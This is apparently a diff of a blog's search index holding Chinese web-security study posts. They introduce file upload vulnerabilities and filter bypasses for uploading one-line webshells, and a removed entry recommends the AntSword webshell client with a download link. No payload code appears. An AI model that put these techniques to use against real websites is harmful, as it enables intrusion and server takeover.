+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传</title>
     <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
@@ -845,18 +885,6 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蚁剑</title>
-    <url>/2024/08/03/%E8%9A%81%E5%89%91/</url>
-    <content><![CDATA[<p>&emsp;&emsp;蚁剑是一个shell控制端软件，最核心的功能就是获取网站的源码和执行shell，同时具备插件的功能，功能性很强大的一款，同时搭配木马上传使用，上传一句话木马，然后用蚁剑连接。链接如下:<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">蚁剑下载和安装</a>,实用指数:⭐⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
 </search>
